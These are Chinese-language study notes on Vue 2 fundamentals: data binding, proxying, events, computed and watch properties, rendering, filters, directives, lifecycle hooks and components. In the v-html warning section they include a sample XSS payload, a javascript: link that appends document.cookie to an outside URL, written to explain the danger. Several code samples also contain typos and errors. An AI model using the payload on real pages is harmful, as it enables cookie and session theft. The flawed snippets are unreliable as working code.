### vue简介

vue特点

- 采用**组件化**模式，提高代码复用率，且让代码更好维护

- **声明式**编码，让编码人员无需直接操作DOM，提高开发效率(类似于面向对象)

  ```vue
  <ul id="list">
      <li v-for="p in person">
      {{p.id}}-{{p.name}}-{{p.age}}
      </li>
  </ul>
  ```

- 使用**虚拟DOM**+优秀的**Diff算法**，尽量复用DOM节点

  - 数据->虚拟DOM->真实DOM
  - 如果有了新的虚拟DOM，vue会将新的和旧的进行比较（Diff比较）



**vue基本语法**

```vue
//el第一种写法
new Vue(
{
el:'#root',
data:{
name:"kitty",
num:1
}
})

//el第二种写法
const v=new Vue({})
v.$mount('#root');

//data第二种写法
new Vue({
el:'root',
data:function(){		//data(){return{}}这种写法也可以
return{
name:'kitty'
}
}
})

```



### vue模板语法

**插值语法只适用于标签体内的内容	{{name}}**

**指令语法适用于标签属性的内容		v-bind:**

- v-bind（单向数据绑定）

  ```vue
  <a v-bind:href="myurl">
  
  <a :href="myurl">	//简写
  
  new Vue({
  
  data:{
  
  myurl:'www.baidu.com'
  
  }})
  ```

  

  - 只要遇到v-bind那么vue会把引号里的东西当成**<u>表达式执行</u>**
  - v-bind可以简写成：

- v-model (双向数据绑定)

  ```vue
  <input type="text" v-model:value="name">
  <input type="text" v-model="name">
  ```

  

  - 改变页面数据，vue实例中对应的数据也改变
  - v-model指令只能用于表单类元素上

  



### mvvm模型

- M（模型）：对应data中的数据
- V（视图）：模板
- VM（视图模型）：Vue实例对象


data中所有的属性最后都出现在了vm身上

vm身上所有的属性及Vue原型上所有属性在Vue模板中可以直接使用



### 数据代理

#### Object.defineProperty方法

给对象添加属性的方法

```javascript
let person={
    name:'kitty',
    sex:'man'
}

Object.defintProperty(person,'age',{value:18})
//添加的属性不参与遍历（不可枚举）,不可修改，不可删除
Object.defintProperty(person,'age',{value:18，enumerable:true,writable:true,configurable:true,get(){
    console.log('有人读取age属性了')
    return number
},set(value){
    console.log("有人修改age的属性,age值为value")
}})

//当有人读取person的age属性时，get函数就会被调用
//当有人修改person的age属性时，set函数就会被调用
//可枚举，可修改，可删除
```



#### 数据代理

数据代理：通过一个对象代理对另一个对象中属性的操作 读/写

```javascript
let obj1={x:100}
let obj2={y:200}
Object.defineProperty(obj2,'x',{
    get(){
        return obj1.x
    },
    set(value){
        obj1.x=value1
    }
})
//通过obj2来操作obj1中的x属性
```



#### Vue中的数据代理

**1. vue中的数据代理是通过vm对象来代理data对象中属性的操作**

_data === data

vue中有一个_data属性来存储data中的内容

- 我们可以直接通过vm.name来获取data中的name属性
  - 具体操作是vm通过get方法获取_data中的name属性
- 我们也可以通过vm直接修改name属性
  - 具体操作是vm通过set方法来修改_data中的name



**2.数据代理的好处**

更加方便操作data中的属性

**3.基本原理**

通过Object.defineProperty()把data对象中所有属性添加到vm上

为每一个添加到vm上的属性都指定一个getter/setter

在getter/setter内部去操作（读/写）data中对应的属性



### 事件处理

**v-on:[事件]**或**@[事件]**来绑定事件

```vue
<h1 @click="showInfo">		//点击h1标签会调用showInfo事件
    hello{{name}}
</h1>

new Vue({
el:"root",
data:{
name:"kitty"
},
methods:{
showInfo(){
alert("你好");
}
}
})
```

- 传参数
  - @click=showInfo($event,number)
  - $event的值为event对象，如果不写的话这个函数里面就收不到event对象的值，number是要传入的参数



#### 事件修饰符

1.  **prevent**：阻止默认事件

- 正常函数阻止默认事件要在函数内加上**event.preventDefault();**这句话来阻止默认事件
- vue中可以**@click.prevent=""**来阻止默认事件（a标签点击跳转...）

2.  **stop**：阻止事件冒泡

3.  **once**：事件只触发一次 

4.  **capture**：使用事件捕获模式 

- 事件是先经历事件捕获然后才会经历事件冒泡
- 事件捕获：由外往内
- 事件冒泡：由内往外

5. **self**：只有event.target是当前操作的元素时才触发事件

6. **passive**：事件的默认行为立即执行，无需等待事件回调执行完毕

- 当监听鼠标滚动滚动条事件，调用函数的时候，执行顺序是调用函数—>函数执行完毕—>页面的滚动条才会滚动
- 函数执行可能要花费很多时间，这样就会造成页面的卡顿
- passive可以立即执行滚动，不需要函数执行完毕才能滚动



```vue
<!-- 1.prevent：阻止默认事件-->
<a href="www.baidu.com" @click.prevent="show">点我提示信息</a>

<!-- 2.stop：阻止事件冒泡
@click.stop.prevent可以组织默认事件和冒泡
-->
<div @click="show">
    <button @click.stop="show">
        点我提示信息
    </button>
</div>

<!-- 3.once：事件只触发一次-->
<button @click.once="show">
        点我提示1次信息
</button>

<!-- 4.capture：事件捕获-->
<div @click.capture="show">
    <div @click="show">
        
    </div>
</div>

<!-- 5.self:只有点击div的时候才能触发div的show方法，点按钮的时候不会触发div的show方法，变相的阻止了事件冒泡-->
<div @click.self="show">
    <button @click="show">
        点我提示信息
    </button>
</div>
```



#### 键盘事件

keyup:按键弹起

keydown:按键按下（tab,ctrl,alt,shift,meta(win按键)配合keydown使用才会正常触发事件，如果配合keyup则按下其他键随后释放其他键事件才被触发）

**@keyup.enter**:按下回车事件

**常用的按键别名**

回车：enter

删除：delete（捕获删除和退格键）

退出：esc

空格：space

换行：tab

上：up

下：down

左：left

右：right

```vue
<input type="text" placeholder="按下回车提示输入" @keyup.enter="show">

methods:{
show(e){
console.log(e.target.value)
}
}
//e.key 按键名字 e.keycode 按键编码
//keycode已废弃，最好不要用
```

**ctrl+y	@keydown.ctrl.y**



### 计算属性

当vue的data数据修改之后，vue会重新解析整个模板，如果methods方法中使用了修改的数据，那么这个方法会重新调用一遍，效率不高，这里就要使用到计算属性。

**计算属性是把已经生成的属性加工计算成一个新的属性**

```vue
 <div id="root">
    姓<input type="text" v-model="firstName"><br>
    名<input type="text" v-model="lastName"><br>
    全名<span>{{fullName}}</span>
    </div>
    <script>
       const vm=new Vue({
        el:'#root',
        data:{
            firstName:"张",
            lastName:"三"
        },
        computed:{
            fullName:{
                get(){
                return this.firstName+'-'+this.lastName;
                },
                set(value){
                    const arr=value.split("-");
                    this.firstName=arr[0];
                    this.lastName=arr[1];

                }
       //fullName简写
                fullName(){return this.firstName+'-'+this.lastName}
            }
        }
       })
    </script>
```

**get函数解析**

1. **get的作用**：当有人读取fullName的值的时候get就会被调用，且返回值为fullName的值
2. **get的this指向**：vue中已经把get的this指向调成了vm对象所以可以通过this.firstName来获取data中的属性
3. **get调用的时机**：初次读取函数的时候（缓存读取到的值），所依赖的数据发生变化的时候

set函数同上

### 监视属性

```vue
<script>
    //第一种写法
let vm=new Vue({
    watch:{
        isHot:{
            immediate:true,	//初始化时让handler调用一次
            //当isHot被修改时handler会被调用
            handler(newValue,oldValue)
            {
                
            },
            
        }
    }
})


//第二种写法
vm.$watch('isHot',{
            immediate:true,	//初始化时让handler调用一次
            //当isHot被修改时handler会被调用
            handler(newValue,oldValue)
            {
                
            }
            
        })
</script>
```



**深度监视**

```vue
<script>
{
    watch:{
        //监视多级结构中某个属性的变化
        'number.a':{
            handler()
            {
                console.log('a被改变了')
            }
        }
        //监视多级结构中所有属性的变化
        //如果去掉deep那么只有number发生变化的时候才会被监视到
        number:{
            deep:true,
                handler()
            {
                console.log('number里的数据发生变化')
            }
        }
    }
}
</script>
```



- Vue中的watch默认不监测对象内部值的改变（一层）
- 配置deep:true可以监测对象内部值改变（多层）
- vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以
- 使用watch时根据数据的具体结构决定是否采用深度监视



**监视属性简写**

```vue
<script>
watch:{
    isHot(newValue,oldValue)
    {
        console("isHot"被改变了);
    }
}
</script>
```



**计算属性和监视属性的区别**

计算属性中不可能开启异步任务去维护数据，但是watch可以

```vue
<script>
watch:{
    //当firstName发生变化的时候fullName会发生变化
    firstName(val){
        //这里的定时器一定要使用箭头函数
        //原因：定时器时交给window去维护的
        //如果不使用箭头函数那么this的指向就是Window
        setTimeout(()=>{
            this.fullName=val+'-'+this.lastName
        },1000);
    }
}
</script>
```



- computed能完成的功能watch都可以完成
- watch能完成地功能computed不一定能完成，例如：watch可以进行异步操作

<u>两个重要的小原则</u>

1. 所有Vue管理的函数最好写成普通函数，这样this的指向才是vm或组件实例对象
2. 所有不被Vue管理的函数（定时器，ajax的回调函数等）最好写成箭头函数，这样this的指向才是vm



### 绑定样式

**绑定class样式**

- 字符串写法
  - 适用于：样式的类名不确定，需要动态指定

```vue
<div id="root">
        <div  class="test" :class="mood" @click="changeM">test</div>
        
</div>

<script>
    let vm=new  Vue({
        el:"#root",
        data:{
            mood:'normal' 
        },
        methods: {
            changeM(){
                const arr=['sad','normal','happy']
                const index=Math.floor(Math.random()*3)
                //Math.radom 生成大于0且小于1的double型随机数
                //Math.radom()*3生成0.???  1.???  2.???
                //Math.floor() 向下取整0,1,2
                this.mood=arr[index]
                }
        },
    })
</script>
```



- 数组写法
  - 适用于：要绑定的样式个数不确定，名字也不确定

```vue
<div :class='arr'></div>

data:{
arr:['a1','a2','a3']
}
```



- 对象写法
  - 适用于：要绑定的样式个数确定，名字也确定，但要动态决定用不用

```vue
<div :class='classObj'></div>
data:{
    classObj:{
        a1:false,
        a2:true
    }
}
```



**绑定style样式**

- 对象写法

```vue
<div style="styleObj"></div>
data:{
    styleObj:{
        fontSize:'40px',
		color:'red'
    }
}
```



- 数组写法

```vue
<div style="styleObj"></div>
data:{
    styleObj1:{
        fontSize:'40px',
		color:'red'
    },
    styleObj2:{
         backGroundColor:'grey'   
        }
}
```



### 条件渲染

使用**v-show**来实现显示和隐藏，v-show的底层实现是通过调整display的属性，**结构保留**

<u>切换频率频繁建议使用v-show，v-show只是改变display，节点还在</u>

> v-show="true"		v-show="1===2"

```vue
<div id="root">
        <span>n的值为{{n}}</span>
        <br>
        <button @click="n++">n+1</button>
        <div v-show="n===1">n1</div>
        <div v-show="n===2">n2</div>
        <div v-show="n===3">n3</div>
    </div>
    <script>
        let vm=new Vue({
            el:"#root",
            data:{
                n:0
            }
        })
    </script>
```










使用**v-if**来实现条件渲染，**结构不保留**

> v-if="1===1"



1. 当v-if条件不成立的时候会显示v-else的内容，v-else后面不用判断条件
2. 使用v-if的时候这几个div都不可以被打断

```vue
<div id="root">
        <span>n的值为{{n}}</span>
        <br>
        <button @click="n++">n+1</button>
        <div v-if="n===1">n1</div>
        <div v-else-if="n===1">n2</div>
    <!--这里当n=1的时n2不会显示-->
        <div v-else-if="n===3">n3</div>
        <div v-else>当n为别的时会显示这个div</div>
    </div>
    <script>
        let vm=new Vue({
            el:"#root",
            data:{
                n:0
            }
        })
    </script>
```



注意：使用v-if的时候元素可能无法获取到，而使用v-show一定可以获取到



### 列表渲染



- 遍历数组

```vue
<h2>遍历数组</h2>
        <ul>
            <li v-for="(value,index) in persons" :key="index">
                {{value.name}}---{{value.age}}
            </li>
        </ul>
    </div>

    <script>
        let vm=new Vue({
            el:'#root',
            data:{
               persons:[
                {name:'kitty',age:20},
                {name:'tom',age:12},
                {name:'alice',age:45}
               ]
            },
        })
    </script>
```

li可以写成以下形式，可以不写index

key一定要写，给每一项一个key

> <li v-for="p in persons" :key='p.id'>



- 遍历对象

```vue
<li v-for="(value,index) in car" :key="index">
                {{index}}---{{value}}
</li>

data:{

    car:{
    name:"奥迪",
    color:"black",
    prise:30
    }
}
```



- 遍历字符串

```vue
<li v-for="(char,index) in str" :key="index">
                {{index}}---{{char}}
</li>

data:{
	str:'hello'
}
```



- 遍历指定次数

```vue
<h2>遍历指定次数</h2>
<ul>
    <li v-for="(num,index) in 5" :key="index">
        {{index}}--{{num}}
    </li>
</ul>
```



#### key的作用和原理

key:给节点进行标识，相当于身份证号

**key的内部原理**

1. 虚拟dom中key的作用：

   key是虚拟DOM对象的标识，当状态中的数据发生变化时，Vue会根据【新数据】生成【新的虚拟DOM】，随后vue进行【新虚拟DOM】与【旧虚拟DOM】的差异比较，比较规则如下：

2. 对比规则：

   （1）旧虚拟DOM中找到了与新虚拟DOM<u>相同的key</u>:

   ​			①若虚拟DOM中内容没有改变，直接使用之前的真实DOM

   ​			②若虚拟DOM中内容改变，则生成新的真实DOM，随后替换掉页面中之前的真实DOM

   （2）旧虚拟DOM中未找到与新虚拟DOM相同的key:

   ​		创建新的真实DOM，随后渲染页面

3. 用index作为key可能引发的问题

   （1）若对数据进行：逆序添加，逆序删除等破坏顺序操作：

   ​				会产生没有必要的真实DOM更新==>界面没问题，但是效率低

   （2）如果结构中还包含输入类的DOM：

   ​				会产生错误DOM更新==>界面有问题

   4.开发中如何选择key

   （1）最好使用每条数据的唯一标识作为key，比如id、手机号、身份证号、学号等唯一标识

   （2）如果不存在对数据的逆序添加、逆序删除等破坏顺序的操作仅仅用于渲染列表用于展示，使用index作为key没问题



#### 列表过滤

利用watch进行列表过滤

```vue
<div id="root">
        <h2>人员列表</h2>
        <input placeholder="请输入姓名" v-model="keyWord">
        <ul>
            <li v-for="p in filPersons" :key="id">
                {{p.name}}--{{p.age}}--{{p.sex}}
            </li>
        </ul>
    </div>

    <script>
        let vm=new Vue({
            el:'#root',
            data:{
                keyWord:'',
               persons:[
                {id:'001',name:"周冬雨",age:16,sex:"女"},
                {id:'002',name:"马冬梅",age:17,sex:"女"},
                {id:'003',name:"周杰伦",age:19,sex:"男"},
                {id:'004',name:"温兆伦",age:23,sex:"男"}
               ],
               filPersons:[]
            },
            watch: {
                keyWord:{
                    immediate:true,
                    handler(val){
                        this.filPersons=this.persons.filter(
                            (p)=>{return p.name.indexOf(val)!==-1}
                        )
                    }
                }
            },
        })
    </script>
```



利用computed进行列表过滤

```vue
computed: {
                filPersons(){
                    return this.persons.filter((p)=>{
                        return p.name.indexOf(this.keyWord)!==-1;
                    })
                }
            },
```



indexOf函数当匹配到空字符串的时候返回的是0，所以如果keyWord没有输入任何东西的时候indexOf函数匹配的是数组中所有元素。

filter函数用于过滤，过滤符合函数参数的数组元素，其返回值是个数组，包含符合条件的元素。

当computed都能实现的时候优先使用computed



#### 列表排序

```vue

 <button @click="sortType=1">年龄升序</button>
        <button @click="sortType=2">年龄降序</button>
        <button @click="sortType=0">年龄原顺序</button>
<!--点击不同的按钮会给sortType赋不同的值-->
<script>
computed: {
                filPersons(){
                    //先过滤
                    let arr= this.persons.filter((p)=>{
                        return p.name.indexOf(this.keyWord)!==-1;
                    })

                    //后排序
                    //监视sortType的值来判断怎么排序的
                    if(this.sortType)   //如果点击了排序按钮
                    {
                        arr.sort((a,b)=>{
                            return this.sortType===1? a.age-b.age: b.age-a.age;
                        })
                    }
                    return arr;
                }
            },
</script>
```



sort排序函数，接收两个参数a和b，当返回a-b的时候升序，返回b-a的时候降序



### Vue监测数据改变原理

#### Vue监测对象

Vue**监测对象**中数据的改变是通过**get和set方法进行监测**的

**Vue中对每个属性都有一个get和set方法，即使是对象中包含的对象都有一个get和set方法**

```vue
<script>
 //创建一个监视的实例对象，用于监视data中属性的变化
        const obs=new Observer(data)
        console.log(obs);
      

        //构造函数Observer
        function Observer(obj){
            //该函数汇总对象中所有属性形成一个数组keys
            const keys=Object.keys(obj)
            //遍历
            keys.forEach((k)=>{
                //将data上的属性添加到原型上
                //这里的this指向实例对象（也就是上方创建出的obs）
                Object.defineProperty(this,k,{
                    get(){
                        return obj[k]
                    },
                    set(val){
                        obj[k]=val
                    }
                })
            })
        }

</script>
```

注意，如果不使用构造函数创建对象的话，那么set方法直接作用于要修改的属性会报错

原因：当执行dataj[k]=val这条语句的时候是修改了data的属性，那么就会再次调用set函数，形成死循环

```html
<script>
let data={
    name:"kitty",
    adress:"北京"
}

Object.defineProperty(data,'name',{
    get(){
        return data.name
    }
    //这样写是错误的，调用set函数会造成死循环
    set(val){
    data.name=val
}
})
</script>
```



如果**直接**往Vue上**添加属性**的话，新添加的属性**没有get和set**函数。

> Vue._data.student.name='tony'

以上添加属性不会实现响应式



这时候要使用Vue的set方法

> Vue.set(vm.student,name,'tony')
>
> vm.$set()	//这种写法也可以(vm可以换为this)
>
> set(目标，属性，属性值)

<u>**set方法局限性**</u>：只能给data里的某一个对象添加属性，但是不能给data添加属性



#### Vue监测数组

<u>数组的七个方法</u>

- push	最后位置新增元素
- pop    删除最后一个元素
- shift    删除第一个元素
- unshif    前面位置新增元素 
- splice    数组指定位置插入、删除、替换元素
- sort    数组排序
- reverse    反转数组



Vue数组中的元素没有get和set方法

只有**调用**以上**七个方法**Vue才承认数组发生了改变，Vue才能监测到数组的变化，才能**重新解析模板**。（也可以通过Vue.set方法来修改数组）

<u>所以用**赋值的方式**去修改数组，Vue**不会响应**，模板也不会重新解析</u>

Vue上的数组方法是重新包装过的，和Arrary原型上的方法是不同的



如果数组的方法产生新的数组，那么要用<u>新数组替换旧数组</u>

> this.student.hobby=this.student.hobby.filter(()=>{})



**数据劫持**

数据劫持发生的操作：更改数据，修改模板

代码中data输入的数据都是直接写入，没有set和get方法。而浏览器中Vue._data查看数据都有get和set方法。

从没有get和set方法到有get和set方法这种变化、行为、操作就称为数据劫持



### 收集表单数据

若：

- <input type="text"> 
  - 则v-model收集的是value值，用户输入的就是value值
- <input type="radio">
  - 则v-model收集的是value值，且要给标签配置value值
- <input type="checkbox">
  - 没有配置input的value属性那么收集的就是checked(勾选[true] or未勾选[false])
  - 配置了input的value值
    - v-model的初始值是非数组，那么收集的就是checked
    - v-model的初始值是数组，那么收集的就是value组成的数组
- v-model三个修饰符
  - lazy:失去焦点再收集数据
  - number:输入字符串转为有效数字
  - trim:输入首尾空格过滤



```vue
<div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="userInfo.account"> <br><br>
            密码：<input type="password" v-model="userInfo.password"><br><br>
            年龄：<input type="number" v-model.number="userInfo.age"><br><br>
            性别：男<input type="radio" v-model="userInfo.sex" name="sex" value="male">
                女<input type="radio" v-model="userInfo.sex" name="sex" value="female"><br><br>
            爱好：学习<input type="checkbox" v-model="userInfo.hobby" name="hobby" value="study">
                吃饭<input type="checkbox" v-model="userInfo.hobby" name="hobby" value="eat">
                打游戏<input type="checkbox" v-model="userInfo.hobby" name="hobby" value="game"><br><br>
            地区：<select v-model="userInfo.place">
                <option value="null">请选择地区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
            </select><br><br>
            输入信息：<textarea v-model.lazy="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.accept">接受<a href="::">用户协议</a> <br><br>
            <button>提交</button>

        </form>
    </div>

    <script>
        let vm=new Vue({
            el:'#root',
            data:{
               userInfo:{
                account:'',
                password:'',
                age:0,
                sex:'',
                hobby:[],
                place:'null',
                other:'',
                accept:false,
               },
            },
            methods: {
                   demo(){
                    console.log(JSON.stringify(this.userInfo)); //转换为JSON格式
                    // alert(1)
                   },
               },
        })
    </script>
```



### 过滤器

**过滤器**：对要显示的数据进行特定格式化后再显示（适用于一些简单逻辑处理）

**语法**



- 注册过滤器 ：Vue.filter(name,callback)  或new Vue(filters:{})
- 使用过滤器：{{传入参数| 过滤器名}} 或v-bind:属性=“传入参数 |过滤器名”

**备注**

- 过滤器也可以接收额外参数，多个过滤器也可以串联
- 过滤器没有改变原来数据，是<u>产生新的对应的数据</u>



全局过滤器可以在全局使用，不论哪个Vue实例都可以用，局部过滤器只能在当前实例中使用。

```vue
<!--调用第三方库，时间函数-->
    <script src="https://cdn.bootcdn.net/ajax/libs/dayjs/1.11.5/dayjs.min.js"></script>
    <div id="root">
        <!--计算属性实现-->
        <h2>当前时间是：{{fmTime}}</h2>
        <!--方法实现-->
        <h2>当前时间是：{{getfmTime()}}</h2>
        <!--过滤器实现-->
        <!--管道可以串联，前面filTime得到的数据传给myslice进行处理-->
        <h2>当前时间是：{{time |filTime('YYYY年MM月DD日') | myslice}}</h2>
    </div>
    <script>
        Vue.config.productionTip = false

        //全局过滤器可以在全局使用
        Vue.filter('myslice',(value)=>{
            return value.slice(0,4)
        })
        let time=new Date().getTime()

        let vm=new Vue({
            el:'#root',
            data:{
               time:time,
            },
            computed:{
                fmTime()
                {
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            methods:{
                getfmTime(){
                    return dayjs(this.time).format('YYYY-MM-DD HH:mm:ss')
                }
            },
            //用filters定义的过滤器是局部过滤器，只能在这个Vue实例中使用
            filters:{
                filTime(val,str){
                    return dayjs(val).format(str)
                },
                // myslice(value){
                //     return value.slice(0,4)
                // }
            }
        })
    </script>
```



### 内置指令

- v-bind

  - 单向绑定解析，可以简写为:

- v-model

  - 双向数据绑定

- v-for

  - 遍历数组/对象/字符串

- v-on

  - 绑定事件监听，可简写为@

- v-if

  - 条件渲染（动态控制节点**是否存在**）

- v-else

  - 条件渲染（动态控制节点**是否存在**）

- v-show

  - 条件渲染（动态控制节点**是否展示**）

- v-text

  - 向其所在的标签插入文本

  ```html
  <div v-text="name"></div>
  <!--相当于-->
  <div>{{name}}</div>
  ```

  - 与插值语法区别：v-text会替换节点中的内容，而{{xx}}不会

- v-html

  - 作用：向指定节点中渲染包含html结构的内容
  - 与插值语法的区别
    - （1）v-html会替换掉节点中所有内容，{{xx}}不会
    - （2）v-html可以识别html结构
  - 注意！v-html**安全性问题**
    - 在网站上动态渲染任意html是非常危险的，容易导致xss攻击
    - 一定要在可信内容上使用v-html，永远不要用在用户提交的内容上

  ```vue
  <div v-html='str'> </div>
  <script>
  data:{
      //这个a标签会将当前的cookie拼接到目标网址后面
      //目标网址就能获取当前页面的cookie
      str:'<a href=javascript:location.href="http://www.baidu.com"+document.cookie'>跳转</a>
  }
  </script>
  ```

  

**cookie**

1. （浏览器->服务器）chrome浏览器携带用户名、密码、请求登录目标网站
2. （服务器->浏览器）登录成功，跳转个人中心，给浏览器cookie【k1:v1,k2:v2...】
3. （浏览器->服务器）浏览器发起查看个人中心中的仓库请求，同时携带【k1:v1,k2:v2...】
4. （服务器->浏览器）返回所有仓库+【k3:v3...】



- v-cloak

  - 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-clock属性
  - 配合css使用，使用css配合v-clock可以解决网速慢时页面展示出{{xxx}}问题

  > 当网速过慢时DOM会先显示在页面上之后再进行渲染（script标签写在body下面时）

  ```vue
  <style>
      <!--属性选择器选取v-clock-->
      [v-clock]{
          display:none;
      }
  </style>
  <div>
      <h2 v-clock>
          {{name}}
      </h2>
  </div>
  ```

- v-once

  - v-once所在节点在初次动态渲染之后，就视为静态内容了
  - 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

  ```vue
  <div id="root">
          <h2 v-once>n的初始值为{{n}}</h2>
          <h2>n+1后的值为{{n}}</h2>
          <button @click="n++">点我n+1</button>
      </div>
  
      <script>
          Vue.config.productionTip = false
          let vm=new Vue({
              el:'#root',
              data:{
                 n:1,
              },
          })
      </script>
  ```

- v-pre

  - 让vue跳过所在节点的编译过程
  - 可以利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译

  ```vue
  <h2 v-pre>没有使用指令语法</h2>
  <h2>
      当前的n值为{{n}}
  </h2>
  ```





### 自定义指令

VUE元素和指令的三个阶段

<u>指令与元素绑定==>指令所在元素插入页面==>指令所在模板被重新解析</u>

#### 自定义指令（函数式）

自定义指令（函数式）何时被调用

1. 指令与元素成功绑定时（一上来，并不是元素被解析到页面上时，在元素被解析到页面上之前）
2. 指令所在模板被重新解析时

**自定义指令使用directives进行的定义**

> 自定义指令名（element，binding）
>
> //element获取DOM元素
>
> //binding获取v-big="value"中的value值

```vue
<!--v-big的功能和v-text类似，但是可以把n放大10倍-->
<h2>n放大10倍的值为<span v-big="n"></span></h2>
<script>
        Vue.config.productionTip = false
        let vm=new Vue({
            el:'#root',
            data:{
               n:1,
            },
            directives:{
                big(element,binding){
                    //element获取DOM元素
                    //binding获取v-big="value"中的value值
                    element.innerText=binding.value *10
                }
            }
        })
    </script>
```



#### 自定义指令（对象式）

- bind(element，binding){}
  - 指令与元素成功绑定时（一上来）被调用
- inserted(element，binding){}
  - 指令所在元素被插入页面时被调用
- update(element，binding){}
  - 指令所在模板被重新解析时被调用

```vue

<!--v-fbind的功能和v-bind类似，但是可以一开始就可以聚焦输入框-->
    <input type="text" v-fbind:value="n">
<script>
fbind:{
                    //元素和指令绑定时
                    bind(element,binding){
                        element.value=binding.value
                    },
                    //元素插入页面
                    inserted(element,binding){
                        element.focus()
                    },
                    //指令所在模板被重新解析时
                    update(element,binding){
                        element.value=binding.value
                    }
</script>
```



**注意事项：**

1. v-big-number的话directives里面要这么写'big-number'

2. 指令相关的this指向window

3. directives中的指令都是局部指令，只能当前实例可以使用

4. 变成全局指令（和filter一样）

   > Vue.directive('fbind',{配置对象}或function(){})



### 生命周期

**生命周期（生命周期钩子，生命周期回调函数，生命周期函数）：**指的就是这些特殊的函数，会在特殊的时间点调用这些函数

- 生命周期函数的名字不可修改，但函数的具体内容是程序员根据需求编写的

- 生命周期函数中的this指向的是vm或组件实例对象



**vm的生命周期**

将要创建===>调用beforeCreate函数

创建完毕===>调用created函数

将要挂载（重要）===>调用beforeMount函数

挂载完毕===>调用mounted函数

将要更新===>调用beforeUpdate函数

更新完毕===>调用updated函数

将要销毁（重要）===>调用beforeDestroy函数

销毁完毕===>调用destroyed函数











示例：

**mounted函数**：Vue完成模板的解析并把初始的真实的DOM元素放入页面后（<u>挂载完毕</u>）调用





![](C:\Users\pxy\Desktop\学习笔记\vue\img\lifecycle.png)



#### 生命周期_挂载流程

1. 创建Vue实例
2. 初始化事件，生命周期

   - **beforeCreate()**函数被调用

   - 数据代理还没开始，无法通过vm访问data中的数据，methods方法
3. 初始化数据监测，数据代理

   - **created()**函数被调用
   - 可以访问vm中的data数据，methods中的方法
4. 解析模板

   - 判断是否有el选项，有的话解析el。没有el选项的话在外部寻找是否有vm.$mounted(el)，有的话解析el，没有的话查看是否有template选项，解析template选项。
   - 此阶段Vue开始解析模板，生成虚拟DOM（内存中），页面还显示不了解析好的内容
   - **beforeMount()**函数被调用，页面呈现的是未经Vue编译的DOM元素，<u>所有对DOM的操作最终不奏效</u>

5. 将内存中的虚拟DOM（$el）转为真实DOM（el）插入页面
   - **mounted()**函数被调用
   - 页面中呈现的是经过Vue编译的DOM，对DOM的操作均有效



#### 生命周期_更新流程

1. 数据更新
   - **beforeUpdate()**函数被调用
   - 数据是新的，但页面是旧的，即页面尚未和数据保持同步
2. 根据数据生成新的虚拟DOM
   - **updated()**函数被调用
   - 新的虚拟DOM和旧的虚拟DOM进行比较，最终完成页面更新（Model—>View）
   - 数据是新的，页面也是新的，即页面和数据保持同步



#### 生命周期_销毁流程

当调用了vm.$destroy()则开始销毁流程

1. 销毁流程开始
   - **beforeDestroy()**函数被调用
   - 此时vm中所有data,methods,指令等等都处于<u>可用状态</u>，马上要执行销毁过程（<u>但是对数据的修改不会触发更新</u>）
   - 一般在此阶段可以关闭定时器，取消订阅消息，解绑自定义事件（销毁不会解绑原生DOM上的事件）等收尾操作例：给button绑定@click事件，那么Vue会给
2. 销毁流程结束
   - **destroyed()**函数被调用



```vue
<div id="root">
        <h2 :style="{opacity}">改变透明度</h2>
        <button @click="stop">停止变化</button>
    </div>

    <script>
        Vue.config.productionTip = false
        let vm=new Vue({
            el:'#root',
            data:{
               opacity:1,
            },
            methods: {
                stop(){
                    vm.$destroy();
                }
            },
            //挂载完毕，开启定时器修改透明度
            mounted() {
                //这里将定时器存储到vm上，方便使用
                this.timer=setInterval(() => {
                    this.opacity-=0.01;
                    if(this.opacity<=0){
                        this.opacity=1;
                    }
                }, 16);
            },
            //销毁结束之前清除定时器
            //为什么不在stop函数里面清除定时器？
            //因为stop函数相当于自杀，如果发生他杀的行为定时器也需要清除，所以在vm被销毁前清除定时器
            beforeDestroy() {
                clearInterval(this.timer);
            },
        })
    </script>
```



### 组件

**组件的定义**：实现应用中局部功能的代码和资源的<u>集合</u>

**组件的优点**：文件好维护，依赖关系不混乱，复用率高 

**模块化**：当应用中的js都以模块来编写，那这个应用就是一个模块化的应用

**组件化**：当应用中的功能都是多组件的方式来编写，你这个应用就是组件化的应用

**非单文件组件**：一个组件中包含n个组件

**单文件组件**：一个文件中包含1个组件



#### 基本使用

创建组件==>注册组件==>使用组件



**创建组件**

- 使用Vue的extend方法创建组件
- 组件中不能有el配置项
- data必须以函数式来写
  - 如果使用对象式的话，两个地方都用到data的时候一个地方改变data另一个地方的data也会跟着改变（相当于指针指向同一个内存区域）
  - 使用函数式每个地方返回的都是一个新的data对象（每次使用都创建新的内存区域）
- template存放HTML结构



**注册组件**

- 在Vue实例中通过components配置项注册（局部注册）
- Vue.component('组件名',组件变量)



**使用组件**

直接在HTML页面中引入标签

```vue
<div id="root">
        <!--第三步：使用组件-->
        <school></school>
        <hr>
        <student></student>
        <!--上面的组件数据改变不会影响下面同名组件-->
        <student></student>
    </div>

    <script>
        Vue.config.productionTip = false
        //第一步：创建组件
        //school组件
        const school=Vue.extend({
            //这里template中的元素必须要有个容器包裹，这里一般用div
            template:`
            <div>
            <h2>学校名称：{{schoolName}}</h2>
            <h2>学校地址：{{address}}</h2>
            <button @click="showName">显示学校名</button>
            </div>
            `,
            data(){
                return{
                    schoolName:'school',
                    address:'beijing'
                }
            },
            //配置方法
            methods: {
                showName(){
                    alert(this.schoolName)
                }
            },
        })

        //student组件
        const student=Vue.extend({
            //这里template中的元素必须要有个容器包裹，这里一般用div
            template:`
            <div>
            <h2>学生姓名：{{studentName}}</h2>
            <h2>学生年龄：{{age}}</h2>
            </div>
            `,
            data(){
                return{
                    studentName:'tom',
                    age:29
                }
            }
        })
        
        //全局注册组件
        Vue.component('school',school)

        let vm=new Vue({
            el:'#root',
            data:{
               
            },
            //第二步：注册组件（局部注册）
            components:{
                school:school,
                //因为名字相同，所以可以缩写
                student
            }
        })
    </script>
```



#### 注意事项

**组件名**

1. 一个单词组成：
   - 首字母小写：school
   - 首字母大写：School
2. 多个单词组成
   - kebab-case命名：my-school
   - CamelCase命名：MySchool（需要Vue脚手架支持）
3. 备注
   - 组件名要避免HTML中已有的元素名称
